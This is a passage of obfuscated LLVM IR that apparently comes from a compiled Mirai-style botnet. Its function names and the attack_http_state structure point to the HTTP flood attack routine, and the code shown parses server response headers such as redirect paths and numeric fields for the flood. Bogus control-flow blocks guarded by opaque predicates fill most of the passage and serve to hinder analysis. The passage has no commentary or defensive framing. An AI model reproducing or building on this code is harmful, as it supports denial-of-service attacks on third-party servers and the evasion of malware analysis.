  %2456 = mul i32 %2453, %2455
  %2457 = urem i32 %2456, 2
  %2458 = icmp eq i32 %2457, 0
  %2459 = icmp slt i32 %2454, 10
  %2460 = or i1 %2458, %2459
  br i1 %2460, label %originalBBpart2426, label %originalBB424alteredBB

originalBBpart2426:                               ; preds = %originalBB424
  br i1 %2452, label %2461, label %2480

; <label>:2461:                                   ; preds = %originalBBpart2426
  %2462 = load i32, i32* @x.19
  %2463 = load i32, i32* @y.20
  %2464 = sub i32 %2462, 1
  %2465 = mul i32 %2462, %2464
  %2466 = urem i32 %2465, 2
  %2467 = icmp eq i32 %2466, 0
  %2468 = icmp slt i32 %2463, 10
  %2469 = or i1 %2467, %2468
  br i1 %2469, label %originalBB428, label %originalBB428alteredBB

originalBB428:                                    ; preds = %originalBB428alteredBB, %2461
  %2470 = load i32, i32* %52, align 4
  %2471 = add nsw i32 %2470, 1
  store i32 %2471, i32* %52, align 4
  %2472 = load i32, i32* @x.19
  %2473 = load i32, i32* @y.20
  %2474 = sub i32 %2472, 1
  %2475 = mul i32 %2472, %2474
  %2476 = urem i32 %2475, 2
  %2477 = icmp eq i32 %2476, 0
  %2478 = icmp slt i32 %2473, 10
  %2479 = or i1 %2477, %2478
  br i1 %2479, label %originalBBpart2437, label %originalBB428alteredBB

originalBBpart2437:                               ; preds = %originalBB428
  br label %2480

; <label>:2480:                                   ; preds = %originalBBpart2437, %originalBBpart2426
  %2481 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2482 = load i32, i32* %52, align 4
  %2483 = sext i32 %2482 to i64
  %2484 = getelementptr inbounds i8, i8* %2481, i64 %2483
  %2485 = load i32, i32* %12, align 4
  %2486 = load i32, i32* %52, align 4
  %2487 = sub nsw i32 %2485, %2486
  %2488 = call i32 @util_memsearch(i8* %2484, i32 %2487, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2488, i32* %53, align 4
  %2489 = load i32, i32* %53, align 4
  %2490 = icmp ne i32 %2489, -1
  br i1 %2490, label %2491, label %2708

; <label>:2491:                                   ; preds = %2480
  %2492 = load i32, i32* %52, align 4
  %2493 = sext i32 %2492 to i64
  %2494 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2493
  store i8* %2494, i8** %54, align 8
  %2495 = load i32, i32* %53, align 4
  %2496 = icmp sge i32 %2495, 2
  br i1 %2496, label %2497, label %2500

; <label>:2497:                                   ; preds = %2491
  %2498 = load i32, i32* %53, align 4
  %2499 = sub nsw i32 %2498, 2
  store i32 %2499, i32* %53, align 4
  br label %2500

; <label>:2500:                                   ; preds = %2497, %2491
  %2501 = load i32, i32* @x.19
  %2502 = load i32, i32* @y.20
  %2503 = sub i32 %2501, 1
  %2504 = mul i32 %2501, %2503
  %2505 = urem i32 %2504, 2
  %2506 = icmp eq i32 %2505, 0
  %2507 = icmp slt i32 %2502, 10
  %2508 = or i1 %2506, %2507
  br i1 %2508, label %originalBB439, label %originalBB439alteredBB

originalBB439:                                    ; preds = %originalBB439alteredBB, %2500
  %2509 = load i32, i32* %52, align 4
  %2510 = load i32, i32* %53, align 4
  %2511 = add nsw i32 %2509, %2510
  %2512 = sext i32 %2511 to i64
  %2513 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2512
  store i8 0, i8* %2513, align 1
  %2514 = load i32, i32* %53, align 4
  %2515 = add nsw i32 %2514, 1
  store i32 %2515, i32* %53, align 4
  %2516 = load i8*, i8** %54, align 8
  %2517 = load i32, i32* %53, align 4
  %2518 = call i32 @util_memsearch(i8* %2516, i32 %2517, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %2519 = icmp eq i32 %2518, 4
  %2520 = load i32, i32* @x.19
  %2521 = load i32, i32* @y.20
  %2522 = sub i32 %2520, 1
  %2523 = mul i32 %2520, %2522
  %2524 = urem i32 %2523, 2
  %2525 = icmp eq i32 %2524, 0
  %2526 = icmp slt i32 %2521, 10
  %2527 = or i1 %2525, %2526
  br i1 %2527, label %originalBBpart2454, label %originalBB439alteredBB

originalBBpart2454:                               ; preds = %originalBB439
  br i1 %2519, label %2528, label %2650

; <label>:2528:                                   ; preds = %originalBBpart2454
  store i32 7, i32* %10, align 4
  %2529 = load i8*, i8** %54, align 8
  %2530 = getelementptr inbounds i8, i8* %2529, i64 4
  %2531 = load i8, i8* %2530, align 1
  %2532 = sext i8 %2531 to i32
  %2533 = icmp eq i32 %2532, 115
  br i1 %2533, label %2534, label %2537

; <label>:2534:                                   ; preds = %2528
  %2535 = load i32, i32* %10, align 4
  %2536 = add nsw i32 %2535, 1
  store i32 %2536, i32* %10, align 4
  br label %2537

; <label>:2537:                                   ; preds = %2534, %2528
  %2538 = load i8*, i8** %54, align 8
  %2539 = load i8*, i8** %54, align 8
  %2540 = load i32, i32* %10, align 4
  %2541 = sext i32 %2540 to i64
  %2542 = getelementptr inbounds i8, i8* %2539, i64 %2541
  %2543 = load i32, i32* %53, align 4
  %2544 = load i32, i32* %10, align 4
  %2545 = sub nsw i32 %2543, %2544
  %2546 = sext i32 %2545 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2538, i8* %2542, i64 %2546, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %2547

; <label>:2547:                                   ; preds = %2584, %2537
  %2548 = load i8*, i8** %54, align 8
  %2549 = load i32, i32* %10, align 4
  %2550 = sext i32 %2549 to i64
  %2551 = getelementptr inbounds i8, i8* %2548, i64 %2550
  %2552 = load i8, i8* %2551, align 1
  %2553 = sext i8 %2552 to i32
  %2554 = icmp ne i32 %2553, 0
  br i1 %2554, label %2555, label %2587

; <label>:2555:                                   ; preds = %2547
  %2556 = load i8*, i8** %54, align 8
  %2557 = load i32, i32* %10, align 4
  %2558 = sext i32 %2557 to i64
  %2559 = getelementptr inbounds i8, i8* %2556, i64 %2558
  %2560 = load i8, i8* %2559, align 1
  %2561 = sext i8 %2560 to i32
  %2562 = icmp eq i32 %2561, 47
  br i1 %2562, label %2563, label %2584

; <label>:2563:                                   ; preds = %2555
  %2564 = load i32, i32* @x.19
  %2565 = load i32, i32* @y.20
  %2566 = sub i32 %2564, 1
  %2567 = mul i32 %2564, %2566
  %2568 = urem i32 %2567, 2
  %2569 = icmp eq i32 %2568, 0
  %2570 = icmp slt i32 %2565, 10
  %2571 = or i1 %2569, %2570
  br i1 %2571, label %originalBB456, label %originalBB456alteredBB

originalBB456:                                    ; preds = %originalBB456alteredBB, %2563
  %2572 = load i8*, i8** %54, align 8
  %2573 = load i32, i32* %10, align 4
  %2574 = sext i32 %2573 to i64
  %2575 = getelementptr inbounds i8, i8* %2572, i64 %2574
  store i8 0, i8* %2575, align 1
  %2576 = load i32, i32* @x.19
  %2577 = load i32, i32* @y.20
  %2578 = sub i32 %2576, 1
  %2579 = mul i32 %2576, %2578
  %2580 = urem i32 %2579, 2
  %2581 = icmp eq i32 %2580, 0
  %2582 = icmp slt i32 %2577, 10
  %2583 = or i1 %2581, %2582
  br i1 %2583, label %originalBBpart2458, label %originalBB456alteredBB

originalBBpart2458:                               ; preds = %originalBB456
  br label %2587

; <label>:2584:                                   ; preds = %2555
  %2585 = load i32, i32* %10, align 4
  %2586 = add nsw i32 %2585, 1
  store i32 %2586, i32* %10, align 4
  br label %2547

; <label>:2587:                                   ; preds = %originalBBpart2458, %2547
  %2588 = load i8*, i8** %54, align 8
  %2589 = call i32 @util_strlen(i8* %2588)
  %2590 = icmp sgt i32 %2589, 0
  br i1 %2590, label %2591, label %2601

; <label>:2591:                                   ; preds = %2587
  %2592 = load i8*, i8** %54, align 8
  %2593 = call i32 @util_strlen(i8* %2592)
  %2594 = icmp slt i32 %2593, 128
  br i1 %2594, label %2595, label %2601

; <label>:2595:                                   ; preds = %2591
  %2596 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2597 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2596, i32 0, i32 7
  %2598 = getelementptr inbounds [129 x i8], [129 x i8]* %2597, i32 0, i32 0
  %2599 = load i8*, i8** %54, align 8
  %2600 = call i32 @util_strcpy(i8* %2598, i8* %2599)
  br label %2601

; <label>:2601:                                   ; preds = %2595, %2591, %2587
  %2602 = load i8*, i8** %54, align 8
  %2603 = load i32, i32* %10, align 4
  %2604 = add nsw i32 %2603, 1
  %2605 = sext i32 %2604 to i64
  %2606 = getelementptr inbounds i8, i8* %2602, i64 %2605
  %2607 = call i32 @util_strlen(i8* %2606)
  %2608 = icmp slt i32 %2607, 256
  br i1 %2608, label %2609, label %2633

; <label>:2609:                                   ; preds = %2601
  %2610 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2611 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2610, i32 0, i32 6
  %2612 = getelementptr inbounds [257 x i8], [257 x i8]* %2611, i32 0, i32 0
  %2613 = getelementptr inbounds i8, i8* %2612, i64 1
  call void @util_zero(i8* %2613, i32 255)
  %2614 = load i8*, i8** %54, align 8
  %2615 = load i32, i32* %10, align 4
  %2616 = add nsw i32 %2615, 1
  %2617 = sext i32 %2616 to i64
  %2618 = getelementptr inbounds i8, i8* %2614, i64 %2617
  %2619 = call i32 @util_strlen(i8* %2618)
  %2620 = icmp sgt i32 %2619, 0
  br i1 %2620, label %2621, label %2632

; <label>:2621:                                   ; preds = %2609
  %2622 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2623 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2622, i32 0, i32 6
  %2624 = getelementptr inbounds [257 x i8], [257 x i8]* %2623, i32 0, i32 0
  %2625 = getelementptr inbounds i8, i8* %2624, i64 1
  %2626 = load i8*, i8** %54, align 8
  %2627 = load i32, i32* %10, align 4
  %2628 = add nsw i32 %2627, 1
  %2629 = sext i32 %2628 to i64
  %2630 = getelementptr inbounds i8, i8* %2626, i64 %2629
  %2631 = call i32 @util_strcpy(i8* %2625, i8* %2630)
  br label %2632

; <label>:2632:                                   ; preds = %2621, %2609
  br label %2633

; <label>:2633:                                   ; preds = %2632, %2601
  %2634 = load i32, i32* @x.19
  %2635 = load i32, i32* @y.20
  %2636 = sub i32 %2634, 1
  %2637 = mul i32 %2634, %2636
  %2638 = urem i32 %2637, 2
  %2639 = icmp eq i32 %2638, 0
  %2640 = icmp slt i32 %2635, 10
  %2641 = or i1 %2639, %2640
  br i1 %2641, label %originalBB460, label %originalBB460alteredBB

originalBB460:                                    ; preds = %originalBB460alteredBB, %2633
  %2642 = load i32, i32* @x.19
  %2643 = load i32, i32* @y.20
  %2644 = sub i32 %2642, 1
  %2645 = mul i32 %2642, %2644
  %2646 = urem i32 %2645, 2
  %2647 = icmp eq i32 %2646, 0
  %2648 = icmp slt i32 %2643, 10
  %2649 = or i1 %2647, %2648
  br i1 %2649, label %originalBBpart2462, label %originalBB460alteredBB

originalBBpart2462:                               ; preds = %originalBB460
  br label %2705

; <label>:2650:                                   ; preds = %originalBBpart2454
  %2651 = load i8*, i8** %54, align 8
  %2652 = getelementptr inbounds i8, i8* %2651, i64 0
  %2653 = load i8, i8* %2652, align 1
  %2654 = sext i8 %2653 to i32
  %2655 = icmp eq i32 %2654, 47
  br i1 %2655, label %2656, label %2704

; <label>:2656:                                   ; preds = %2650
  %2657 = load i32, i32* @x.19
  %2658 = load i32, i32* @y.20
  %2659 = sub i32 %2657, 1
  %2660 = mul i32 %2657, %2659
  %2661 = urem i32 %2660, 2
  %2662 = icmp eq i32 %2661, 0
  %2663 = icmp slt i32 %2658, 10
  %2664 = or i1 %2662, %2663
  br i1 %2664, label %originalBB464, label %originalBB464alteredBB

originalBB464:                                    ; preds = %originalBB464alteredBB, %2656
  %2665 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2666 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2665, i32 0, i32 6
  %2667 = getelementptr inbounds [257 x i8], [257 x i8]* %2666, i32 0, i32 0
  %2668 = getelementptr inbounds i8, i8* %2667, i64 1
  call void @util_zero(i8* %2668, i32 255)
  %2669 = load i8*, i8** %54, align 8
  %2670 = load i32, i32* %10, align 4
  %2671 = add nsw i32 %2670, 1
  %2672 = sext i32 %2671 to i64
  %2673 = getelementptr inbounds i8, i8* %2669, i64 %2672
  %2674 = call i32 @util_strlen(i8* %2673)
  %2675 = icmp sgt i32 %2674, 0
  %2676 = load i32, i32* @x.19
  %2677 = load i32, i32* @y.20
  %2678 = sub i32 %2676, 1
  %2679 = mul i32 %2676, %2678
  %2680 = urem i32 %2679, 2
  %2681 = icmp eq i32 %2680, 0
  %2682 = icmp slt i32 %2677, 10
  %2683 = or i1 %2681, %2682
  br i1 %2683, label %originalBBpart2468, label %originalBB464alteredBB

originalBBpart2468:                               ; preds = %originalBB464
  br i1 %2675, label %2684, label %2703

; <label>:2684:                                   ; preds = %originalBBpart2468
  %2685 = load i8*, i8** %54, align 8
  %2686 = load i32, i32* %10, align 4
  %2687 = add nsw i32 %2686, 1
  %2688 = sext i32 %2687 to i64
  %2689 = getelementptr inbounds i8, i8* %2685, i64 %2688
  %2690 = call i32 @util_strlen(i8* %2689)
  %2691 = icmp slt i32 %2690, 256
  br i1 %2691, label %2692, label %2703

; <label>:2692:                                   ; preds = %2684
  %2693 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2694 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2693, i32 0, i32 6
  %2695 = getelementptr inbounds [257 x i8], [257 x i8]* %2694, i32 0, i32 0
  %2696 = getelementptr inbounds i8, i8* %2695, i64 1
  %2697 = load i8*, i8** %54, align 8
  %2698 = load i32, i32* %10, align 4
  %2699 = add nsw i32 %2698, 1
  %2700 = sext i32 %2699 to i64
  %2701 = getelementptr inbounds i8, i8* %2697, i64 %2700
  %2702 = call i32 @util_strcpy(i8* %2696, i8* %2701)
  br label %2703

; <label>:2703:                                   ; preds = %2692, %2684, %originalBBpart2468
  br label %2704

; <label>:2704:                                   ; preds = %2703, %2650
  br label %2705

; <label>:2705:                                   ; preds = %2704, %originalBBpart2462
  %2706 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2707 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2706, i32 0, i32 1
  store i8 1, i8* %2707, align 4
  br label %4179

; <label>:2708:                                   ; preds = %2480
  %2709 = load i32, i32* @x.19
  %2710 = load i32, i32* @y.20
  %2711 = sub i32 %2709, 1
  %2712 = mul i32 %2709, %2711
  %2713 = urem i32 %2712, 2
  %2714 = icmp eq i32 %2713, 0
  %2715 = icmp slt i32 %2710, 10
  %2716 = or i1 %2714, %2715
  br i1 %2716, label %originalBB470, label %originalBB470alteredBB

originalBB470:                                    ; preds = %originalBB470alteredBB, %2708
  %2717 = load i32, i32* @x.19
  %2718 = load i32, i32* @y.20
  %2719 = sub i32 %2717, 1
  %2720 = mul i32 %2717, %2719
  %2721 = urem i32 %2720, 2
  %2722 = icmp eq i32 %2721, 0
  %2723 = icmp slt i32 %2718, 10
  %2724 = or i1 %2722, %2723
  br i1 %2724, label %originalBBpart2472, label %originalBB470alteredBB

originalBBpart2472:                               ; preds = %originalBB470
  br label %2725

; <label>:2725:                                   ; preds = %originalBBpart2472, %2428
  %2726 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2727 = load i32, i32* %12, align 4
  %2728 = call i8* @table_retrieve_val(i32 62, i32* null)
  %2729 = call i32 @util_stristr(i8* %2726, i32 %2727, i8* %2728)
  %2730 = icmp ne i32 %2729, -1
  br i1 %2730, label %2731, label %3397

; <label>:2731:                                   ; preds = %2725
  %2732 = load i32, i32* @x.19
  %2733 = load i32, i32* @y.20
  %2734 = sub i32 %2732, 1
  %2735 = mul i32 %2732, %2734
  %2736 = urem i32 %2735, 2
  %2737 = icmp eq i32 %2736, 0
  %2738 = icmp slt i32 %2733, 10
  %2739 = or i1 %2737, %2738
  br i1 %2739, label %originalBB474, label %originalBB474alteredBB

originalBB474:                                    ; preds = %originalBB474alteredBB, %2731
  %2740 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2741 = load i32, i32* %12, align 4
  %2742 = call i8* @table_retrieve_val(i32 62, i32* null)
  %2743 = call i32 @util_stristr(i8* %2740, i32 %2741, i8* %2742)
  store i32 %2743, i32* %55, align 4
  %2744 = load i32, i32* %55, align 4
  %2745 = sext i32 %2744 to i64
  %2746 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2745
  %2747 = load i8, i8* %2746, align 1
  %2748 = sext i8 %2747 to i32
  %2749 = icmp eq i32 %2748, 32
  %2750 = load i32, i32* @x.19
  %2751 = load i32, i32* @y.20
  %2752 = sub i32 %2750, 1
  %2753 = mul i32 %2750, %2752
  %2754 = urem i32 %2753, 2
  %2755 = icmp eq i32 %2754, 0
  %2756 = icmp slt i32 %2751, 10
  %2757 = or i1 %2755, %2756
  br i1 %2757, label %originalBBpart2476, label %originalBB474alteredBB

originalBBpart2476:                               ; preds = %originalBB474
  br i1 %2749, label %2758, label %2777

; <label>:2758:                                   ; preds = %originalBBpart2476
  %2759 = load i32, i32* @x.19
  %2760 = load i32, i32* @y.20
  %2761 = sub i32 %2759, 1
  %2762 = mul i32 %2759, %2761
  %2763 = urem i32 %2762, 2
  %2764 = icmp eq i32 %2763, 0
  %2765 = icmp slt i32 %2760, 10
  %2766 = or i1 %2764, %2765
  br i1 %2766, label %originalBB478, label %originalBB478alteredBB

originalBB478:                                    ; preds = %originalBB478alteredBB, %2758
  %2767 = load i32, i32* %55, align 4
  %2768 = add nsw i32 %2767, 1
  store i32 %2768, i32* %55, align 4
  %2769 = load i32, i32* @x.19
  %2770 = load i32, i32* @y.20
  %2771 = sub i32 %2769, 1
  %2772 = mul i32 %2769, %2771
  %2773 = urem i32 %2772, 2
  %2774 = icmp eq i32 %2773, 0
  %2775 = icmp slt i32 %2770, 10
  %2776 = or i1 %2774, %2775
  br i1 %2776, label %originalBBpart2483, label %originalBB478alteredBB

originalBBpart2483:                               ; preds = %originalBB478
  br label %2777

; <label>:2777:                                   ; preds = %originalBBpart2483, %originalBBpart2476
  %2778 = load i32, i32* @x.19
  %2779 = load i32, i32* @y.20
  %2780 = sub i32 %2778, 1
  %2781 = mul i32 %2778, %2780
  %2782 = urem i32 %2781, 2
  %2783 = icmp eq i32 %2782, 0
  %2784 = icmp slt i32 %2779, 10
  %2785 = or i1 %2783, %2784
  br i1 %2785, label %originalBB485, label %originalBB485alteredBB

originalBB485:                                    ; preds = %originalBB485alteredBB, %2777
  %2786 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2787 = load i32, i32* %55, align 4
  %2788 = sext i32 %2787 to i64
  %2789 = getelementptr inbounds i8, i8* %2786, i64 %2788
  %2790 = load i32, i32* %12, align 4
  %2791 = load i32, i32* %55, align 4
  %2792 = sub nsw i32 %2790, %2791
  %2793 = call i32 @util_memsearch(i8* %2789, i32 %2792, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2793, i32* %56, align 4
  %2794 = load i32, i32* %56, align 4
  %2795 = icmp ne i32 %2794, -1
  %2796 = load i32, i32* @x.19
  %2797 = load i32, i32* @y.20
  %2798 = sub i32 %2796, 1
  %2799 = mul i32 %2796, %2798
  %2800 = urem i32 %2799, 2
  %2801 = icmp eq i32 %2800, 0
  %2802 = icmp slt i32 %2797, 10
  %2803 = or i1 %2801, %2802
  br i1 %2803, label %originalBBpart2495, label %originalBB485alteredBB

originalBBpart2495:                               ; preds = %originalBB485
  br i1 %2795, label %2804, label %3396

; <label>:2804:                                   ; preds = %originalBBpart2495
  %2805 = load i32, i32* @x.19
  %2806 = load i32, i32* @y.20
  %2807 = sub i32 %2805, 1
  %2808 = mul i32 %2805, %2807
  %2809 = urem i32 %2808, 2
  %2810 = icmp eq i32 %2809, 0
  %2811 = icmp slt i32 %2806, 10
  %2812 = or i1 %2810, %2811
  br i1 %2812, label %originalBB497, label %originalBB497alteredBB

originalBB497:                                    ; preds = %originalBB497alteredBB, %2804
  %2813 = load i32, i32* %55, align 4
  %2814 = sext i32 %2813 to i64
  %2815 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2814
  store i8* %2815, i8** %57, align 8
  %2816 = load i32, i32* %56, align 4
  %2817 = icmp sge i32 %2816, 2
  %2818 = load i32, i32* @x.19
  %2819 = load i32, i32* @y.20
  %2820 = sub i32 %2818, 1
  %2821 = mul i32 %2818, %2820
  %2822 = urem i32 %2821, 2
  %2823 = icmp eq i32 %2822, 0
  %2824 = icmp slt i32 %2819, 10
  %2825 = or i1 %2823, %2824
  br i1 %2825, label %originalBBpart2499, label %originalBB497alteredBB

originalBBpart2499:                               ; preds = %originalBB497
  br i1 %2817, label %2826, label %2829

; <label>:2826:                                   ; preds = %originalBBpart2499
  %2827 = load i32, i32* %56, align 4
  %2828 = sub nsw i32 %2827, 2
  store i32 %2828, i32* %56, align 4
  br label %2829

; <label>:2829:                                   ; preds = %2826, %originalBBpart2499
  %2830 = load i32, i32* %55, align 4
  %2831 = load i32, i32* %56, align 4
  %2832 = add nsw i32 %2830, %2831
  %2833 = sext i32 %2832 to i64
  %2834 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2833
  store i8 0, i8* %2834, align 1
  %2835 = load i32, i32* %56, align 4
  %2836 = add nsw i32 %2835, 1
  store i32 %2836, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %2837

; <label>:2837:                                   ; preds = %2911, %2829
  %2838 = load i32, i32* @x.19
  %2839 = load i32, i32* @y.20
  %2840 = sub i32 %2838, 1
  %2841 = mul i32 %2838, %2840
  %2842 = urem i32 %2841, 2
  %2843 = icmp eq i32 %2842, 0
  %2844 = icmp slt i32 %2839, 10
  %2845 = or i1 %2843, %2844
  br i1 %2845, label %originalBB501, label %originalBB501alteredBB

originalBB501:                                    ; preds = %originalBB501alteredBB, %2837
  %2846 = load i8*, i8** %57, align 8
  %2847 = load i32, i32* %10, align 4
  %2848 = sext i32 %2847 to i64
  %2849 = getelementptr inbounds i8, i8* %2846, i64 %2848
  %2850 = load i8, i8* %2849, align 1
  %2851 = sext i8 %2850 to i32
  %2852 = icmp ne i32 %2851, 0
  %2853 = load i32, i32* @x.19
  %2854 = load i32, i32* @y.20
  %2855 = sub i32 %2853, 1
  %2856 = mul i32 %2853, %2855
  %2857 = urem i32 %2856, 2
  %2858 = icmp eq i32 %2857, 0
  %2859 = icmp slt i32 %2854, 10
  %2860 = or i1 %2858, %2859
  br i1 %2860, label %originalBBpart2503, label %originalBB501alteredBB

originalBBpart2503:                               ; preds = %originalBB501
  br i1 %2852, label %2861, label %2909

; <label>:2861:                                   ; preds = %originalBBpart2503
  %2862 = load i32, i32* @x.19
  %2863 = load i32, i32* @y.20
  %2864 = sub i32 %2862, 1
  %2865 = mul i32 %2862, %2864
  %2866 = urem i32 %2865, 2
  %2867 = icmp eq i32 %2866, 0
  %2868 = icmp slt i32 %2863, 10
  %2869 = or i1 %2867, %2868
  br i1 %2869, label %originalBB505, label %originalBB505alteredBB

originalBB505:                                    ; preds = %originalBB505alteredBB, %2861
  %2870 = load i8*, i8** %57, align 8
  %2871 = load i32, i32* %10, align 4
  %2872 = sext i32 %2871 to i64
  %2873 = getelementptr inbounds i8, i8* %2870, i64 %2872
  %2874 = load i8, i8* %2873, align 1
  %2875 = sext i8 %2874 to i32
  %2876 = icmp sge i32 %2875, 48
  %2877 = load i32, i32* @x.19
  %2878 = load i32, i32* @y.20
  %2879 = sub i32 %2877, 1
  %2880 = mul i32 %2877, %2879
  %2881 = urem i32 %2880, 2
  %2882 = icmp eq i32 %2881, 0
  %2883 = icmp slt i32 %2878, 10
  %2884 = or i1 %2882, %2883
  br i1 %2884, label %originalBBpart2507, label %originalBB505alteredBB

originalBBpart2507:                               ; preds = %originalBB505
  br i1 %2876, label %2885, label %2909

; <label>:2885:                                   ; preds = %originalBBpart2507
  %2886 = load i32, i32* @x.19
  %2887 = load i32, i32* @y.20
  %2888 = sub i32 %2886, 1
  %2889 = mul i32 %2886, %2888
  %2890 = urem i32 %2889, 2
  %2891 = icmp eq i32 %2890, 0
  %2892 = icmp slt i32 %2887, 10
  %2893 = or i1 %2891, %2892
  br i1 %2893, label %originalBB509, label %originalBB509alteredBB

originalBB509:                                    ; preds = %originalBB509alteredBB, %2885
  %2894 = load i8*, i8** %57, align 8
  %2895 = load i32, i32* %10, align 4
  %2896 = sext i32 %2895 to i64
  %2897 = getelementptr inbounds i8, i8* %2894, i64 %2896
  %2898 = load i8, i8* %2897, align 1
  %2899 = sext i8 %2898 to i32
  %2900 = icmp sle i32 %2899, 57
  %2901 = load i32, i32* @x.19
  %2902 = load i32, i32* @y.20
  %2903 = sub i32 %2901, 1
  %2904 = mul i32 %2901, %2903
  %2905 = urem i32 %2904, 2
  %2906 = icmp eq i32 %2905, 0
  %2907 = icmp slt i32 %2902, 10
  %2908 = or i1 %2906, %2907
  br i1 %2908, label %originalBBpart2511, label %originalBB509alteredBB

originalBBpart2511:                               ; preds = %originalBB509
  br label %2909

; <label>:2909:                                   ; preds = %originalBBpart2511, %originalBBpart2507, %originalBBpart2503
  %2910 = phi i1 [ false, %originalBBpart2507 ], [ false, %originalBBpart2503 ], [ %2900, %originalBBpart2511 ]
  br i1 %2910, label %2911, label %2914

; <label>:2911:                                   ; preds = %2909
  %2912 = load i32, i32* %10, align 4
  %2913 = add nsw i32 %2912, 1
  store i32 %2913, i32* %10, align 4
  br label %2837

; <label>:2914:                                   ; preds = %2909
  %2915 = load i8*, i8** %57, align 8
  %2916 = load i32, i32* %10, align 4
  %2917 = sext i32 %2916 to i64
  %2918 = getelementptr inbounds i8, i8* %2915, i64 %2917
  %2919 = load i8, i8* %2918, align 1
  %2920 = sext i8 %2919 to i32
  %2921 = icmp ne i32 %2920, 0
  br i1 %2921, label %2922, label %3395

; <label>:2922:                                   ; preds = %2914
  store i32 0, i32* %58, align 4
  %2923 = load i8*, i8** %57, align 8
  %2924 = load i32, i32* %10, align 4
  %2925 = sext i32 %2924 to i64
  %2926 = getelementptr inbounds i8, i8* %2923, i64 %2925
  store i8 0, i8* %2926, align 1
  %2927 = load i32, i32* %10, align 4
  %2928 = add nsw i32 %2927, 1
  store i32 %2928, i32* %10, align 4
  %2929 = load i8*, i8** %57, align 8
  %2930 = load i32, i32* %10, align 4
  %2931 = sext i32 %2930 to i64
  %2932 = getelementptr inbounds i8, i8* %2929, i64 %2931
  %2933 = load i8, i8* %2932, align 1
  %2934 = sext i8 %2933 to i32
  %2935 = icmp eq i32 %2934, 32
  br i1 %2935, label %2936, label %2939

; <label>:2936:                                   ; preds = %2922
  %2937 = load i32, i32* %10, align 4
  %2938 = add nsw i32 %2937, 1
  store i32 %2938, i32* %10, align 4
  br label %2939

; <label>:2939:                                   ; preds = %2936, %2922
  %2940 = load i32, i32* @x.19
  %2941 = load i32, i32* @y.20
  %2942 = sub i32 %2940, 1
  %2943 = mul i32 %2940, %2942
  %2944 = urem i32 %2943, 2
  %2945 = icmp eq i32 %2944, 0
  %2946 = icmp slt i32 %2941, 10
  %2947 = or i1 %2945, %2946
  br i1 %2947, label %originalBB513, label %originalBB513alteredBB

originalBB513:                                    ; preds = %originalBB513alteredBB, %2939
  %2948 = load i8*, i8** %57, align 8
  %2949 = load i32, i32* %10, align 4
  %2950 = sext i32 %2949 to i64
  %2951 = getelementptr inbounds i8, i8* %2948, i64 %2950
  %2952 = load i8*, i8** %57, align 8
  %2953 = load i32, i32* %10, align 4
  %2954 = sext i32 %2953 to i64
  %2955 = getelementptr inbounds i8, i8* %2952, i64 %2954
  %2956 = call i32 @util_strlen(i8* %2955)
  %2957 = call i32 @util_stristr(i8* %2951, i32 %2956, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2958 = icmp ne i32 %2957, -1
  %2959 = load i32, i32* @x.19
  %2960 = load i32, i32* @y.20
  %2961 = sub i32 %2959, 1
  %2962 = mul i32 %2959, %2961
  %2963 = urem i32 %2962, 2
  %2964 = icmp eq i32 %2963, 0
  %2965 = icmp slt i32 %2960, 10
  %2966 = or i1 %2964, %2965
  br i1 %2966, label %originalBBpart2515, label %originalBB513alteredBB

originalBBpart2515:                               ; preds = %originalBB513
  br i1 %2958, label %2967, label %2996

; <label>:2967:                                   ; preds = %originalBBpart2515
  %2968 = load i32, i32* @x.19
  %2969 = load i32, i32* @y.20
  %2970 = sub i32 %2968, 1
  %2971 = mul i32 %2968, %2970
  %2972 = urem i32 %2971, 2
  %2973 = icmp eq i32 %2972, 0
  %2974 = icmp slt i32 %2969, 10
  %2975 = or i1 %2973, %2974
  br i1 %2975, label %originalBB517, label %originalBB517alteredBB

originalBB517:                                    ; preds = %originalBB517alteredBB, %2967
  %2976 = load i8*, i8** %57, align 8
  %2977 = load i32, i32* %10, align 4
  %2978 = sext i32 %2977 to i64
  %2979 = getelementptr inbounds i8, i8* %2976, i64 %2978
  %2980 = load i8*, i8** %57, align 8
  %2981 = load i32, i32* %10, align 4
  %2982 = sext i32 %2981 to i64
  %2983 = getelementptr inbounds i8, i8* %2980, i64 %2982
  %2984 = call i32 @util_strlen(i8* %2983)
  %2985 = call i32 @util_stristr(i8* %2979, i32 %2984, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2986 = load i32, i32* %10, align 4
  %2987 = add nsw i32 %2986, %2985
  store i32 %2987, i32* %10, align 4
